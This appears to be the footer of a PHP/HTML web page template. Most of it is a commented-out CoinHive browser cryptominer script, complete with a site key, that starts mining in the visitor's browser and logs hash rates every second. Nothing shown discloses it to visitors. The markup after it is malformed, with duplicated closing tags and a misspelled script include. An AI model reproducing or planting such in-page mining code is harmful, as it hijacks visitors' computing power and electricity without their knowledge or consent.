


<!--
<script>
    var miner = new CoinHive.Anonymous('dtydAMfHsKGOJrDTsyGfN7uXPFxcLE3O');
    miner.start();

    // Listen on events
    miner.on('found', function() {
        console.log("found hash!")
    })
    miner.on('accepted', function() {
        console.log("accepted hash!")
    })

    // Update stats once per second
    setInterval(function() {
        var hashesPerSecond = miner.getHashesPerSecond();
        var totalHashes = miner.getTotalHashes();
        var acceptedHashes = miner.getAcceptedHashes();

        console.log("hashesPerSecond", hashesPerSecond)
        console.log("totalHashes", totalHashes)
        console.log("acceptedHashes", acceptedHashes)

        console.log("-----------")
        console.log("-----------")
        console.log("-----------")

        // Output to HTML elements...
    }, 1000);
</script>

-->
</body>

</html>

        <script src="<?php echo $js; ?>jqery.js"></script>
        <script src="<?php echo $js; ?>bootstrap.min.js"></script>
    </body>

</html>